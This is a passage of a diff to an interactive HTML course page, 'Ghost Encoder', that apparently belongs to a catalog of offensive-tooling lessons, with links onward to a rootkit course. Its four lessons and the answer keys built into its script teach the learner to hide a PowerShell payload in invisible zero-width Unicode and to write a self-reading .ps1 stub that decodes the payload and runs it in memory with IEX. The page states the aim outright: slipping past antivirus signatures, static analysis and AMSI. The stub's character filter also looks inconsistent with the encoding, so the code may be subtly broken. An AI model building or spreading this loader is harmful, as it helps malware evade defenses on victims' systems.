-    # 2. prepend the bootstrap stub
-    # 3. return stub + encoded (invisible) payload
-    ..."></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(4)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-4"></div>
-        <div class="explain-box" id="explain-4">
-          <h3>// WHAT JUST HAPPENED — GHOST ENCODER COMPLETE</h3>
-          <p>The stub uses <code>$PSCommandPath</code> — the full path to the currently executing PS1 file. Reads its own source. Filters to chars outside printable ASCII range (our invisible Unicode chars fall there). Decodes. Executes.</p>
-          <p>The actual ghost_encode.py in CHEYANNE uses a cleaner approach: base64-encode the payload, store it as a regular PS1 here-string at the bottom of the file, and hide a zero-width encoded decryption key in the middle. Layered obfuscation.</p>
-          <p>The key insight: AV scanners look for known-bad strings. Base64+invisible encoding produces neither. The real code never appears as text in the file. The file passes static analysis. The payload executes at runtime.</p>
-          <p>Combined with <code>-EncodedCommand</code> (base64 whole-script to PowerShell) and the AMSI bypass from Lesson 3 of the CHEYANNE course: the full chain bypasses both signature and AMSI scanning.</p>
-        </div>
-        <button class="btn-next" id="next-4" onclick="showComplete()">🎯 COURSE COMPLETE</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(3)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(4)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="complete-screen" id="complete-screen">
-      <h2>// GHOST ENCODER — COMPLETE</h2>
-      <p>You can now encode any payload into invisible Unicode and decode it at runtime.<br>The Ghost Alphabet. Nibble splitting. The bootstrap stub.</p>
-      <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="rootkit.html">Next: VADER Rootkit →</a></p>
-    </div>
-  </main>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write GHOST_ALPHABET (16 \uXXXX escape sequences matching the codebook) and GHOST_REVERSE (one-line dict comprehension reversing it). Exact code points and inline hex comments required.</p>
+  <textarea class="code-editor" id="editor-1" spellcheck="false" placeholder="GHOST_ALPHABET = [&#10;    '​',  # 0x0&#10;    ...&#10;]&#10;GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(1)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-1"></div>
+  <div class="explain" id="explain-1">
+    <h4>// WHY THIS WORKS</h4>
+    <p>These code points are Unicode "format characters" — they have no visual representation in any standard renderer but are preserved through file I/O and copy-paste. The reverse map gives O(1) lookup during decoding instead of O(n) linear search. One-line dict comprehension using enumerate() is idiomatic Python.</p>
+  </div>
+  <div class="next-wrap" id="next-1">
+    <button class="btn btn-prev" onclick="goLesson(1)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(2)">NEXT LESSON →</button>
+  </div>
 </div>
+
+<!-- LESSON 2 -->
+<div class="lesson" id="lesson-2">
+  <div class="lesson-header">
+    <span class="lang-badge lang-python">PYTHON 3 — BIT OPS</span>
+    <div class="lesson-tag">// LESSON 02 / 04 — ENCODE BYTES</div>
+    <h2>Splitting the Byte — Nibble by Nibble</h2>
+    <p>Every byte is 8 bits. Split it in half: top 4 bits (high nibble) and bottom 4 bits (low nibble). Each nibble is 0-15 — exactly the index range of the 16-character alphabet. Two invisible characters per byte, zero data loss.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    You're writing a two-digit hex code in invisible ink. Byte <code>0xA3</code>: high digit A, low digit 3. Look up digit A: symbol 10. Look up digit 3: symbol 3. Write the two invisible symbols. <strong>The recipient reverses it: symbol → digit, pair of digits → byte. Encoding is just splitting. Decoding is just reassembling.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — BIT OPERATIONS</h4>
+    <table>
+      <tr><td>nibble</td><td>Half a byte. 4 bits. Holds 0-15. "High nibble" = top 4 bits. "Low nibble" = bottom 4 bits. Two nibbles reconstruct one byte perfectly.</td></tr>
+      <tr><td><code>byte >> 4</code></td><td>Right shift by 4 positions. Moves bits 4-7 down to positions 0-3. Bottom 4 bits fall off the edge. Result = high nibble as integer 0-15.</td></tr>
+      <tr><td><code>&amp; 0x0F</code></td><td>Bitwise AND with 0b00001111. Zeroes out top 4 bits, passes bottom 4 unchanged. Result = low nibble as integer 0-15. Also applied after >> as a safety mask.</td></tr>
+      <tr><td><code>for byte in data</code></td><td>Iterating a <code>bytes</code> object yields integers 0-255, not characters. Each iteration gives you one byte as an int you can do bit math on.</td></tr>
+      <tr><td><code>encoded.append()</code></td><td>Adds to end of list. Two appends per byte (high nibble char first, then low nibble char). Result list is exactly 2× the length of input bytes.</td></tr>
+      <tr><td><code>''.join(encoded)</code></td><td>Joins list of strings into one string with empty separator. Standard Python — faster than + in a loop, works for any list size.</td></tr>
+      <tr><td>type annotation</td><td><code>data: bytes</code> and <code>-> str</code> are documentation hints. Python doesn't enforce them at runtime. They clarify intent: bytes in, invisible string out.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>def encode_bytes(data: bytes) -> str:   <span class="cm"># bytes in, invisible-encoded string out</span>
+    encoded = []
+    for byte in data:                    <span class="cm"># iterating bytes yields integers 0-255</span>
+        high = (byte >> 4) &amp; 0x0F       <span class="cm"># shift right 4: high nibble in bits 0-3, masked 0-15</span>
+        low = byte &amp; 0x0F              <span class="cm"># AND mask: isolate bottom 4 bits → low nibble 0-15</span>
+        encoded.append(GHOST_ALPHABET[high])  <span class="cm"># high nibble index → invisible char</span>
+        encoded.append(GHOST_ALPHABET[low])   <span class="cm"># low nibble index → invisible char</span>
+    return ''.join(encoded)             <span class="cm"># join list → one invisible string</span></pre>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write encode_bytes(). Iterate bytes, extract high/low nibbles with bit ops, look each up in GHOST_ALPHABET, append both chars, join and return. Include type annotations.</p>
+  <textarea class="code-editor" id="editor-2" spellcheck="false" placeholder="def encode_bytes(data: bytes) -> str:&#10;    encoded = []&#10;    for byte in data:&#10;        high = ...&#10;        low = ..."></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(2)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-2"></div>
+  <div class="explain" id="explain-2">
+    <h4>// WHY THIS WORKS</h4>
+    <p>The <code>&amp; 0x0F</code> after right-shifting is defensive — Python integers have arbitrary precision, so a pathological input could give a result > 15 without the mask. The mask costs one extra operation per byte but guarantees the GHOST_ALPHABET index is always valid (0-15).</p>
+  </div>
+  <div class="next-wrap" id="next-2">
+    <button class="btn btn-prev" onclick="goLesson(1)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(3)">NEXT LESSON →</button>
+  </div>
+</div>
+
+<!-- LESSON 3 -->
+<div class="lesson" id="lesson-3">
+  <div class="lesson-header">
+    <span class="lang-badge lang-python">PYTHON 3 — REVERSE OPS</span>
+    <div class="lesson-tag">// LESSON 03 / 04 — DECODE GHOST</div>
+    <h2>Reading the Invisible — Reassembling Bytes</h2>
+    <p>You receive text that may look normal. Scan every character — keep only ones in the codebook, discard everything else. Pair them: high nibble + low nibble → one byte. All visible text characters fail the codebook test and vanish silently.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    UV light reveals only the invisible symbols. The decoder scans every character: visible text → not in GHOST_REVERSE → discard. Invisible symbol → in GHOST_REVERSE → keep. After filtering, pair them: first = high nibble, second = low nibble. <strong>Two symbols reconstruct one byte. No length header needed. The structure is self-delineating — pairs always align because the encoder always writes exactly two chars per byte.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — DECODING + LIST COMPREHENSIONS</h4>
+    <table>
+      <tr><td>list comprehension</td><td><code>[expr for var in iterable if condition]</code>. Filters + transforms in one line. The <code>if</code> is optional. More readable than a for-loop with if+append. Python optimises it internally.</td></tr>
+      <tr><td><code>c in GHOST_REVERSE</code></td><td>Dictionary key membership test — O(1). Returns True only if c is in the codebook. All visible ASCII characters fail this test and are silently discarded.</td></tr>
+      <tr><td><code>range(0, len, 2)</code></td><td>Range with step=2. Generates 0, 2, 4, 6... Processes a list two elements at a time without overlap. Element i = high nibble, element i+1 = low nibble.</td></tr>
+      <tr><td><code>GHOST_REVERSE[char]</code></td><td>Dictionary lookup: char → nibble index 0-15. The inverse of GHOST_ALPHABET[index]. O(1) lookup, built once at init.</td></tr>
+      <tr><td><code>(high &lt;&lt; 4) | low</code></td><td>Reconstruct the byte. Left-shift high nibble 4 positions back to bits 4-7, then OR in the low nibble. Exact inverse of <code>(byte >> 4)</code> and <code>(byte &amp; 0x0F)</code>.</td></tr>
+      <tr><td><code>bytes(result)</code></td><td>Convert list of integers to a bytes object. Each integer must be 0-255. Returns the original decoded binary data.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>def decode_ghost(ghost_text: str) -> bytes:
+    result = []
+    <span class="cm"># Filter: keep only chars in the codebook. Visible text gets discarded.</span>
+    chars = [c for c in ghost_text if c in GHOST_REVERSE]
+    <span class="cm"># Process in pairs: [0]+[1]=byte0, [2]+[3]=byte1, etc.</span>
+    for i in range(0, len(chars), 2):
+        high = GHOST_REVERSE[chars[i]]      <span class="cm"># first of pair → high nibble 0-15</span>
+        low = GHOST_REVERSE[chars[i + 1]]   <span class="cm"># second of pair → low nibble 0-15</span>
+        result.append((high &lt;&lt; 4) | low)   <span class="cm"># shift high to bits 4-7, OR in low → original byte</span>
+    return bytes(result)                    <span class="cm"># list of ints → bytes</span></pre>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write decode_ghost(). Filter to codebook chars only. Iterate pairs with range step=2. Reconstruct each byte with shift + OR. Return as bytes.</p>
+  <textarea class="code-editor" id="editor-3" spellcheck="false" placeholder="def decode_ghost(ghost_text: str) -> bytes:&#10;    result = []&#10;    chars = [c for c in ghost_text if c in GHOST_REVERSE]&#10;    for i in range(0, len(chars), 2):&#10;        ..."></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(3)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-3"></div>
+  <div class="explain" id="explain-3">
+    <h4>// WHY THIS WORKS</h4>
+    <p>The filter step is what makes Ghost resilient to transmission noise. If the encoded text passes through a system that adds whitespace or line breaks, those characters aren't in GHOST_REVERSE and are silently dropped. The decoder only processes codebook characters. No framing, no length prefix — the invisible chars form a self-delimiting sequence.</p>
+  </div>
+  <div class="next-wrap" id="next-3">
+    <button class="btn btn-prev" onclick="goLesson(2)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(4)">NEXT LESSON →</button>
+  </div>
+</div>
+
+<!-- LESSON 4 -->
+<div class="lesson" id="lesson-4">
+  <div class="lesson-header">
+    <span class="lang-badge lang-python">PYTHON 3 — CODE GENERATION</span>
+    <div class="lesson-tag">// LESSON 04 / 04 — PS1 BOOTSTRAP</div>
+    <h2>The Self-Decoding Wrapper — One File, Two Layers</h2>
+    <p>The output .ps1 file has two layers: a visible PowerShell bootstrap (reads itself, extracts the hidden payload, decodes and runs it) and the invisible encoded payload appended at the end. No external decoder. The file carries its own key.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    The letter is also the decoder. It tells the reader: "scan me, filter for invisible symbols, decode them, execute." <strong>The PS1 bootstrap reads itself from disk via <code>$PSCommandPath</code>, extracts the encoded characters, converts to base64, and runs the result with IEX. The invisible payload is appended after the visible code — one .ps1 file is the entire operation.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — STRING GENERATION + POWERSHELL BOOTSTRAP</h4>
+    <table>
+      <tr><td><code>.encode('utf-8')</code></td><td>Convert Python string to bytes using UTF-8. encode_bytes() operates on bytes, not strings — always encode the PS1 payload text before passing it in.</td></tr>
+      <tr><td>adjacent string literals</td><td><code>("line1\n" "line2\n")</code> — Python automatically concatenates adjacent string literals inside parentheses at compile time. Builds multi-line strings without triple-quotes or explicit +.</td></tr>
+      <tr><td><code>$PSCommandPath</code></td><td>PowerShell automatic variable. Full path of the currently executing script. The bootstrap uses this to read its own source from disk.</td></tr>
+      <tr><td><code>.ToCharArray()</code></td><td>Converts string to array of characters. Required to pipe individual chars through <code>Where-Object</code> (the <code>?{...}</code> filter block).</td></tr>
+      <tr><td><code>[int][char]$_ -lt 33</code></td><td>Cast char to int, compare to 33. Filters for characters with low Unicode code points. The encoded invisible payload characters fall in a specific range this filter targets.</td></tr>
+      <tr><td><code>IEX</code></td><td>Invoke-Expression. Executes a string as PowerShell code in the current session. The decoded payload runs in memory — no file written to disk.</td></tr>
+      <tr><td><code>simple_stub + encoded</code></td><td>Concatenate: visible bootstrap PS1 code + invisible encoded payload. Together they form the final .ps1 file. Bootstrap runs when executed; payload rides invisibly inside.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>def generate_ghost_ps1(payload_ps1: str) -> str:
+    payload_bytes = payload_ps1.encode('utf-8')   <span class="cm"># PS1 text → bytes (encode_bytes needs bytes)</span>
+    encoded = encode_bytes(payload_bytes)          <span class="cm"># bytes → invisible string via GHOST_ALPHABET</span>
+    simple_stub = (
+        "# ghost\n"                               <span class="cm"># visible PS1 comment — cover story</span>
+        "$src = [IO.File]::ReadAllText($PSCommandPath)\n"  <span class="cm"># script reads itself from disk</span>
+        "$zw = [string]::new(($src.ToCharArray() | ?{[int][char]$_ -lt 33}))\n"  <span class="cm"># filter to low-codepoint chars</span>
+        "$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($zw))\n"  <span class="cm"># encode filtered chars as base64</span>
+        "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)))\n"  <span class="cm"># decode + execute in memory</span>
+    )
+    return simple_stub + encoded  <span class="cm"># visible bootstrap + invisible payload = one .ps1</span></pre>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write generate_ghost_ps1(). Encode the payload to bytes, run encode_bytes(), build the PS1 stub as adjacent string literals inside parentheses, return stub + encoded payload.</p>
+  <textarea class="code-editor" id="editor-4" spellcheck="false" placeholder="def generate_ghost_ps1(payload_ps1: str) -> str:&#10;    payload_bytes = payload_ps1.encode('utf-8')&#10;    encoded = encode_bytes(payload_bytes)&#10;    simple_stub = (&#10;        &quot;# ghost\n&quot;&#10;        ...&#10;    )&#10;    return simple_stub + encoded"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(4)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-4"></div>
+  <div class="explain" id="explain-4">
+    <h4>// WHY THIS WORKS</h4>
+    <p>The bootstrap is entirely printable ASCII — passes visual inspection and most string-based detection. The encoded payload is all invisible Unicode — matches no known PowerShell pattern. The file is self-contained: no decoder binary, no external key. One .ps1 file, two invisible layers.</p>
+  </div>
+  <div class="next-wrap" id="next-4">
+    <button class="btn btn-prev" onclick="goLesson(3)">← PREV</button>
+    <button class="btn btn-next" onclick="showComplete()">FINISH COURSE →</button>
+  </div>
+</div>
+
+<div class="complete-screen" id="complete-screen">
+  <h2>// GHOST ENCODER — COMPLETE</h2>
+  <p>Invisible ink alphabet. Nibble encoder. Reverse decoder. Self-decoding PS1 bootstrap.<br>Unicode steganography from first principles.</p>
+  <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="rootkit.html">Next: VADER Rootkit →</a></p>
+</div>
+</main>
+</div>
+
 <script>
-const COURSE_KEY = '22div_course_ghost';
-const TOTAL = 4;
-const EXPECTED = {
-  1: `GHOST_ALPHABET = [
+const COURSE_KEY='22div_course_ghost';
+const TOTAL=4;
+const EXPECTED={
+  1:`GHOST_ALPHABET = [
     '\\u200b',  # 0x0
     '\\u200c',  # 0x1
     '\\u200d',  # 0x2
@@ -372,7 +375,7 @@ const EXPECTED = {
     '\\u180e',  # 0xF
 ]
 GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}`,
-  2: `def encode_bytes(data: bytes) -> str:
+  2:`def encode_bytes(data: bytes) -> str:
     encoded = []
     for byte in data:
         high = (byte >> 4) & 0x0F
@@ -380,7 +383,7 @@ GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}`,
         encoded.append(GHOST_ALPHABET[high])
         encoded.append(GHOST_ALPHABET[low])
     return ''.join(encoded)`,
-  3: `def decode_ghost(ghost_text: str) -> bytes:
+  3:`def decode_ghost(ghost_text: str) -> bytes:
     result = []
     chars = [c for c in ghost_text if c in GHOST_REVERSE]
     for i in range(0, len(chars), 2):
@@ -388,7 +391,7 @@ GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}`,
         low = GHOST_REVERSE[chars[i + 1]]
         result.append((high << 4) | low)
     return bytes(result)`,
-  4: `def generate_ghost_ps1(payload_ps1: str) -> str:
+  4:`def generate_ghost_ps1(payload_ps1: str) -> str:
     payload_bytes = payload_ps1.encode('utf-8')
     encoded = encode_bytes(payload_bytes)
     simple_stub = (
@@ -400,16 +403,17 @@ GHOST_REVERSE = {c: i for i, c in enumerate(GHOST_ALPHABET)}`,
     )
     return simple_stub + encoded`
 };
-function loadProgress() { return JSON.parse(localStorage.getItem(COURSE_KEY) || '{}'); }
-function saveProgress(p) { localStorage.setItem(COURSE_KEY, JSON.stringify(p)); updateUI(p); }
-function updateUI(p) {
-  const done = Object.values(p).filter(Boolean).length;
-  document.getElementById('overall-prog').style.width = Math.round(done/TOTAL*100)+'%';
-  document.getElementById('overall-label').textContent = `${done} / ${TOTAL} complete`;
-  for (let i=1;i<=TOTAL;i++) { const el=document.getElementById(`nav-${i}`); if(el){el.classList.toggle('done',!!p[i]);} }
+function loadProgress(){return JSON.parse(localStorage.getItem(COURSE_KEY)||'{}');}
+function saveProgress(p){localStorage.setItem(COURSE_KEY,JSON.stringify(p));updateUI(p);}
+function updateUI(p){
+  const done=Object.values(p).filter(Boolean).length;
+  const pct=Math.round((done/TOTAL)*100);
+  document.getElementById('overall-prog').style.width=pct+'%';
+  document.getElementById('overall-label').textContent=`${done} / ${TOTAL} complete`;
+  for(let i=1;i<=TOTAL;i++){const el=document.getElementById(`nav-${i}`);if(el)el.classList.toggle('done',!!p[i]);}
 }
-let cur = 1;
-function goLesson(n) {
+let cur=1;
+function goLesson(n){
   document.getElementById(`lesson-${cur}`)?.classList.remove('active');
   document.getElementById(`nav-${cur}`)?.classList.remove('active');
   document.getElementById('complete-screen').classList.remove('show');
@@ -418,34 +422,41 @@ function goLesson(n) {
   document.getElementById(`nav-${n}`)?.classList.add('active');
   window.scrollTo(0,0);
 }
-function showComplete() {
+function showComplete(){
   document.getElementById(`lesson-${cur}`)?.classList.remove('active');
   document.getElementById('complete-screen').classList.add('show');
   window.scrollTo(0,0);
 }
-function normalize(c) { return c.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#')&&!l.startsWith('//')).join('\n'); }
-function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-function checkCode(n) {
+function normalize(c){return c.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('#')&&!l.startsWith('//')).join('\n');}
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function checkCode(n){
   const user=normalize(document.getElementById(`editor-${n}`).value);
   const exp=normalize(EXPECTED[n]||'');
-  const ul=user.split('\n'), el=exp.split('\n');
-  let ok=0, html='';
-  el.forEach((e,i)=>{ const u=ul[i]||''; if(u===e){ok++;html+=`<div class="line-ok">✓ ${escHtml(e)}</div>`;}else{html+=`<div class="line-err">✗ Exp: ${escHtml(e)}<br>&nbsp;&nbsp;Got: ${escHtml(u)||'(missing)'}</div>`;} });
-  const re=document.getElementById(`result-${n}`), ed=document.getElementById(`editor-${n}`);
+  const ul=user.split('\n'),el=exp.split('\n');
+  let ok=0,html='';
+  el.forEach((e,i)=>{const u=ul[i]||'';if(u===e){ok++;html+=`<div class="line-ok">✓ ${escHtml(e)}</div>`;}else{html+=`<div class="line-err">✗ Expected: ${escHtml(e)}<br>&nbsp;&nbsp;&nbsp;Got:&nbsp;&nbsp;&nbsp;&nbsp; ${escHtml(u)||'(missing)'}</div>`;}});
+  const re=document.getElementById(`result-${n}`),ed=document.getElementById(`editor-${n}`);
   if(ok===el.length){
     re.innerHTML=`<div class="result-pass">✓ CORRECT — ${ok}/${el.length} lines</div>`+html;
     ed.classList.add('pass');ed.classList.remove('fail');
     document.getElementById(`explain-${n}`)?.classList.add('show');
     document.getElementById(`next-${n}`)?.classList.add('show');
     const p=loadProgress();p[n]=true;saveProgress(p);
-  } else {
+  }else{
     re.innerHTML=`<div class="result-fail">✗ ${ok}/${el.length} correct</div>`+html;
     ed.classList.add('fail');ed.classList.remove('pass');
   }
 }
-function skipLesson(n) { const p=loadProgress();p[n]=true;saveProgress(p);document.getElementById(`explain-${n}`)?.classList.add('show');document.getElementById(`next-${n}`)?.classList.add('show');if(n<TOTAL)goLesson(n+1);else showComplete(); }
+function skipLesson(n){
+  const p=loadProgress();p[n]=true;saveProgress(p);
+  document.getElementById(`explain-${n}`)?.classList.add('show');
+  document.getElementById(`next-${n}`)?.classList.add('show');
+  if(n<TOTAL)goLesson(n+1);else showComplete();
+}
 updateUI(loadProgress());
-document.querySelectorAll('.code-editor').forEach(ta=>{ta.addEventListener('keydown',e=>{if(e.key==='Tab'){e.preventDefault();const s=ta.selectionStart;ta.value=ta.value.substring(0,s)+'    '+ta.value.substring(ta.selectionEnd);ta.selectionStart=ta.selectionEnd=s+4;}});});
+document.querySelectorAll('.code-editor').forEach(ta=>{
+  ta.addEventListener('keydown',e=>{if(e.key==='Tab'){e.preventDefault();const s=ta.selectionStart;ta.value=ta.value.substring(0,s)+'    '+ta.value.substring(ta.selectionEnd);ta.selectionStart=ta.selectionEnd=s+4;}});
+});
 </script>
 </body>
 </html>
